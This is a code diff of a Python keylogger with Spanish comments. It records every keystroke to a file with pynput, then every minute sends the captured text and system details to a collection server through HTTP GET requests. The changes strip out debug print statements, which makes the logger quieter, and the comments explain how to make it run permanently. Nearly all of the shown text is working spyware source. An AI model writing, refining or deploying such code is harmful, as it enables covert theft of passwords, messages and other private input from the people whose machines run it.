@@ -22,8 +22,9 @@ import re
 
 # Proceso para capturar y escribir en un docuemento las teclas presionadas.
 def key_recorder(key):
+      # Calculamos el nombre del archivo a crear.
       d=datetime.datetime.now().strftime('%Y-%m-%d_%H-%M')
-      # d=datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
+
       # Cargamos en key el valor de la tecla presionada.
       key=str(key)
 
@@ -48,10 +49,7 @@ def key_recorder(key):
 
 # Código para iniciar el keylogger
 def keylogger():
-      print('invocando al Keylogger, HILO 1')
       # Código 
-     
-
       with Listener(on_press=key_recorder) as l:
             l.join()
 
@@ -63,7 +61,6 @@ def uploadData():
 
       # Para hacer pruebas. Para un funcionamiento permantente, comentar por "while True"
       while i<100000:
-            print('Proceso upload corriendo ... ')
             
             # Lógica principal del programa 
             text = ''
@@ -71,15 +68,8 @@ def uploadData():
             time.sleep(60)
             try:
                   f= open('keylogger_{}.txt'.format(d),'r')
-                  print('Leyendo')
                   text = f.read()
                   response = requests.get('http://localhost:5000/upload/' + text )
-
-                  if response:
-                        print('Info cargada exitosamente')
-                  else:
-                        print('Error cargando la info')
-
 
             except Exception as e:
                   print('No encontrado')
@@ -87,8 +77,6 @@ def uploadData():
 
             # Para hacer pruebas. Para un funcionamiento permantente, comentar la siguiente línea.
             i = i + 1
-      
-      print('me morí')
 
 def uploadSysInfo():
       file= open('systemInfo.txt','w')
@@ -100,7 +88,6 @@ def uploadSysInfo():
       text = text + 'Arquitectura de Python y Sistema Operativo: ' + str(platform.architecture()) + '%'
       text = text + 'Modelo de procesador: ' + str(platform.processor())
       file.write(text)
-      print(text)
       file.close()
       text = 'var sysInfo = \\`' + text + '\\`'
       requests.get('http://localhost:5000/uploadSysInfo/' + text.replace('\\','') )
